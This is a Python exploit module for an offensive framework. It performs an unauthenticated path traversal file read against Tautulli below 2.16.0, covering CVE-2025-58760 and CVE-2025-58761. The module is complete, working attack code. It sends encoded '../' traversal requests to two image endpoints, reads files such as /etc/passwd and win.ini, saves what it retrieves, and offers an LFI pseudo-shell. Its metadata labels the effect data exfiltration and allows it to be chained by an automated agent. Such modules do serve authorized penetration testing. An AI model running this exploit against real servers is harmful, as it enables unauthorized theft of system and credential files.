#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tautulli unauthenticated path traversal file read (CVE-2025-58760 / CVE-2025-58761)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Tautulli < 2.16.0 - Unauthenticated Path Traversal (CVE-2025-58760)',
        'description': (
            'Tautulli prior to 2.16.0 allows unauthenticated arbitrary file read via '
            '/image/images/<traversal> and /pms_image_proxy?img=... (CVE-2025-58760 / '
            'CVE-2025-58761).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2025-58760', 'CVE-2025-58761'],
        'platform': Platform.MULTI,
        'references': [
            'https://github.com/Tautulli/Tautulli/security/advisories/GHSA-8g4r-8f3f-hghp',
            'https://github.com/Tautulli/Tautulli/security/advisories/GHSA-r732-m675-wj7w',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-58760',
        ],
        'tags': ['tautulli', 'lfi', 'file-read', 'unauth', 'cve-2025-58760'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2025_58760_detect'],
            },
        },
    }
    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    depth = OptInteger(10, 'Number of ../ segments', required=False, advanced=True)
    base_path = OptString('', 'Optional Tautulli base path prefix', required=False)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        if not remote:
            return ''
        trav = '/'.join(['%2e%2e'] * max(1, int(self.depth or 10)))
        prefix = self._prefix()
        candidates = (
            f'{prefix}/image/images/{trav}/{remote}',
            f'{prefix}/pms_image_proxy?img=interfaces/default/images/{trav}/{remote}',
        )
        for path in candidates:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if body.strip():
                return body
        return ''

    def check(self):
        body = self.execute('/etc/passwd')
        if re.search(r'root:.*:0:0:', body or ''):
            return {
                'vulnerable': True,
                'reason': 'CVE-2025-58760 confirmed: /etc/passwd readable',
                'confidence': 'high',
            }
        body = self.execute('/windows/win.ini')
        if body and '[fonts]' in body.lower():
            return {
                'vulnerable': True,
                'reason': 'CVE-2025-58760 confirmed: win.ini readable',
                'confidence': 'high',
            }
        return {
            'vulnerable': False,
            'reason': 'Path traversal probes failed',
            'confidence': 'medium',
        }

    def run(self):
        if self.shell_lfi:
            print_status('LFI pseudo-shell via Tautulli image endpoints')
            self.handler_lfi()
            return True

        remote = str(self.file_read or '').strip()
        data = self.execute(remote)
        if not data:
            print_error('File read failed')
            return False

        print_success(f'Read {len(data)} bytes from {remote}')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as e:
                print_error(f'Could not write output_file: {e}')
                return False
        else:
            limit = int(self.output_limit or 0)
            print_info(data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]')
        return True
